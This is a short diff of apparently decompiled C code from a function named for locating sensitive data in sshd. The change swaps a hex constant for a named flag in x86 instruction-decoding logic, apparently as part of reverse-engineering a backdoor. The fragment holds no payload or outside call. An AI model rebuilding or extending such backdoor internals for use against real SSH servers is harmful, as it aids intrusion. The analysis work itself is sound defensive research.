@@ -51,7 +51,7 @@ BOOL sshd_find_sensitive_data_base_via_krb5ccname
           if (string_scan_ctx.prefix.modrm_bytes.modrm_mod == '\x03') {
             if (((string_scan_ctx.prefix.flags_u16 & 0x20) == 0) ||
                ((string_scan_ctx.prefix.modrm_bytes.rex_byte & 8) == 0)) {
-              dest_reg = string_scan_ctx.prefix.decoded.flags & 0x40;
+              dest_reg = string_scan_ctx.prefix.decoded.flags & DF1_MODRM;
               if ((string_scan_ctx.prefix.flags_u16 & 0x1040) == 0) {
                 if ((string_scan_ctx.prefix.flags_u16 & 0x40) != 0) {
                   tracked_reg = 0;
